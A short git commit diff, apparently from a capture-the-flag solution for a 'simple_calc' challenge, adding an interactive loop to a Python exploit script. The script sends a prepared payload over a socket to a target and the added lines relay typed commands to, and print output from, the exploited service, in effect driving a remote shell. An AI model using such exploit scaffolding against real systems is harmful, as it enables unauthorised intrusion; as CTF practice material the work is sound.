67aae7bbe8a92103a326749e8189c162348eb7a6
kierk <kierke@bu.edu>
2016-03-05 15:53:29 -0500

    working simple_calc python script solve

--- bkp/bkp_simple_calc.py
+++ bkp/bkp_simple_calc.py
@@ -724,4 +724,22 @@ ret = '''254
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((host,port))
 client.send(ret)
+while True:
+	recv_len = 1
+	response = ""
+
+	while recv_len:
+		data = client.recv(4096)
+		recv_len = len(data)
+		response += data
+
+		if recv_len <  4096:
+			break
+
+	print response,
+
+	buffer = raw_input("")
+	buffer += "\n"
+	client.send(buffer)
+
 #client.interactive()
